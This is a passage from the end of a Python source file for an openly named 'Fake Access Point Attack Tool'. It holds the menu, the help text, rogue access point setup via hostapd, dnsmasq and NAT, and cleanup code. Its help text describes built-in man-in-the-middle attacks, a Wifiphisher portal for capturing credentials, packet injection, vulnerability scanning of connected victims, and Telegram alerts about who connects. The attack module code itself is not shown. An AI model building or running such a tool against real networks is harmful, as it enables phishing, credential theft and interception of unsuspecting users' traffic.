        print(GREEN + "[+] Notifications stopped.\n" + RESET)
    else:
        print(CYAN + "[*] No notifications are running.\n" + RESET)


def notifications_menu():
    while True:
        print(BLUE + """
[TELEGRAM NOTIFICATIONS]
  1) Start Notifications
  2) Stop Notifications
  3) Back to Main Menu
""" + RESET)
        option = input(YELLOW + "Select an option: " + RESET).strip()
        if option == "1":
            start_telegram_notifications()
        elif option == "2":
            stop_telegram_notifications()
        elif option == "3":
            break
        else:
            print(RED + "[-] Invalid option, please try again." + RESET)


def automate_network_configuration():
    print(GREEN + "[+] Starting automated network configuration..." + RESET)
    interface = select_interface()
    if not interface:
        print(RED + "[-] No interface found for network configuration." + RESET)
        return

    # Reset the interface and disable conflicting services
    reset_interface(interface)
    
    # Configure the interface in AP mode
    ap_interface = enable_ap_mode(interface)
    
    # Assign a static IP (e.g., 192.168.1.1/24)
    configure_network(ap_interface)
    
    # Configure dnsmasq with DHCP range and lease time (adjust as needed)
    configure_dnsmasq(ap_interface, "192.168.1.50,192.168.1.150", "12h")
    
    # Start hostapd to bring up the AP
    start_hostapd()
    
    # Enable NAT to provide Internet connectivity to connected clients
    enable_nat()
    
    print(GREEN + "[+] Automated network configuration completed.\n" + RESET)


def restore_network_configuration():
    import subprocess
    print(GREEN + "[+] Restoring network configuration and stopping the attack..." + RESET)

    # Stop critical services
    subprocess.run("sudo systemctl stop hostapd", shell=True, check=False)
    subprocess.run("sudo systemctl stop dnsmasq", shell=True, check=False)
    subprocess.run("sudo killall -9 wpa_supplicant hostapd dnsmasq", shell=True, check=False)
    
    # Flush the NAT table in iptables
    subprocess.run("sudo iptables -t nat -F", shell=True, check=False)
    
    # Restore wireless interfaces to Managed mode
    interfaces = list_interfaces()
    if interfaces:
        for iface in interfaces:
            print(GREEN + f"[+] Restoring interface {iface} to Managed mode..." + RESET)
            subprocess.run(f"sudo nmcli device set {iface} managed yes", shell=True, check=False)
            subprocess.run(f"sudo ip link set {iface} down", shell=True, check=False)
            subprocess.run(f"sudo iw dev {iface} set type managed", shell=True, check=False)
            subprocess.run(f"sudo ip link set {iface} up", shell=True, check=False)
    else:
        print(RED + "[-] No wireless interfaces found to restore." + RESET)
    
    # Optionally restart the Network Manager
    subprocess.run("sudo systemctl restart NetworkManager", shell=True, check=False)
    print(GREEN + "[+] Network configuration restored. Attack stopped.\n" + RESET)


def help_documentation():
    print(BLUE + """
==============================
       HELP & DOCUMENTATION
==============================

This Fake AP attack tool integrates the following functionalities:

1) Create Fake AP:
   - Sets up a fake access point (Fake AP) using hostapd, dnsmasq, and NAT.
   - Documentation:
       - Hostapd: https://w1.fi/hostapd/
       - Dnsmasq: http://www.thekelleys.org.uk/dnsmasq/doc.html

2) MITM Attack:
   - Allows performing Man-In-The-Middle attacks with Bettercap, DNS spoofing with Ettercap, and Proxy MITM with mitmproxy.
   - Documentation:
       - Bettercap: https://www.bettercap.org/
       - Ettercap: https://ettercap.github.io/ettercap/
       - Mitmproxy: https://mitmproxy.org/
       - Evilginx2: https://github.com/kgretzky/evilginx2

3) Phishing Portal (Wifiphisher):
   - Launches phishing scenarios to capture credentials and sensitive data.
   - Documentation: https://wifiphisher.org/

4) Sniffing, Packet Injection and Manipulation:
   - Enables passive traffic capture and interaction with Scapy for analysis, injection, and packet manipulation.
   - Documentation:
       - Tcpdump: https://www.tcpdump.org/
       - Scapy: https://scapy.readthedocs.io/en/latest/usage.html

5) Vulnerability Scanning:
   - Uses Nmap with NSE scripts to detect vulnerabilities in connected devices.
   - Documentation:
       - Nmap NSE: https://nmap.org/nsedoc/
       - Nmap: https://nmap.org/

6) Monitor Connected Clients:
   - Displays in real-time the devices connected to the Fake AP.
   
7) Real-Time Notifications (Telegram):
   - Sends notifications about connected devices via a Telegram bot.
   - Documentation:
       - Telegram Bots API: https://core.telegram.org/bots/api

8) Report Generation and Analysis:
   - Allows generating CSV reports and analyzing them later.

9) Restore Network Configuration:
   - Stops the attack tools and restores the network to its original state (hostapd, dnsmasq, iptables, etc.).

For more details and usage examples, refer to the official documentation of each tool using the provided links.

Press ENTER to return to the main menu...
""" + RESET)
    input()


def banner():
    print(BLUE + """
    ==============================
    FAKE ACCESS POINT ATTACK TOOL
    ==============================
    [1] Create Fake AP
    [2] MITM Attack
    [3] Phishing Portal
    [4] Sniffing and Injection
    [5] Vulnerability Scan on Connected Devices    
    [6] Monitor Connected Clients
    [7] Real-Time Notifications        
    [8] Generate and Analyze Reports
    [9] Restore Network Configuration
    [10] Help & Documentation
    [11] Exit
    """ + RESET)


def main():
    # Check for updates
    check_for_updates()
    # Check for virtual environment.
    create_virtual_environment()
    global ap_interface_global
    install_dependencies()
    while True:
        banner()
        option = input(YELLOW + "Select an option: " + RESET)
        if option == "1":
            network_configuration_menu()
        elif option == "2":
            start_mitm_menu()   # Call the MITM attacks submenu
        elif option == "3":
            start_phishing_portal()
        elif option == "4":
            sniffing_menu()
        elif option == "5":
            scan_vulnerabilities()
        elif option == "6":
            monitor_clients()
        elif option == "7":
            notifications_menu()
        elif option == "8":
            reports_menu()
        elif option == "9":
            restore_network_configuration()
        elif option == "10":
            help_documentation()
        elif option == "11":
            print(GREEN + "[+] Exiting..." + RESET)
            if ap_interface_global:
                recover_interface(ap_interface_global)
            try:
                subprocess.run("sudo iptables -t nat -F", shell=True, check=True)
                print(GREEN + "[+] iptables configuration restored." + RESET)
            except Exception as e:
                print(RED + "Error cleaning iptables:" + str(e) + RESET)
            
            # Restore Ettercap configurations if backups exist
            if os.path.exists("/etc/ettercap/etter.conf.bak"):
                subprocess.run("sudo mv /etc/ettercap/etter.conf.bak /etc/ettercap/etter.conf", shell=True, check=False)
                print(GREEN + "[+] Ettercap configuration restored." + RESET)
            else:
                print(CYAN + "[+] No backup of /etc/ettercap/etter.conf found, skipping restoration." + RESET)
            
            if os.path.exists("/etc/ettercap/etter.dns.bak"):
                subprocess.run("sudo mv /etc/ettercap/etter.dns.bak /etc/ettercap/etter.dns", shell=True, check=False)
                print(GREEN + "[+] Ettercap DNS configuration restored." + RESET)
            else:
                print(CYAN + "[+] No backup of /etc/ettercap/etter.dns found, skipping restoration." + RESET)
                
            # Stop notifications if they are running
            stop_telegram_notifications()  
            
            # Remove the virtual environment to leave everything as it was
            if os.path.exists("venv"):
                print(GREEN + "[+] Removing virtual environment..." + RESET)
                shutil.rmtree("venv")
            
            break
        else:
            print(RED + "[-] Invalid option, please try again." + RESET)


if __name__ == "__main__":
    main()
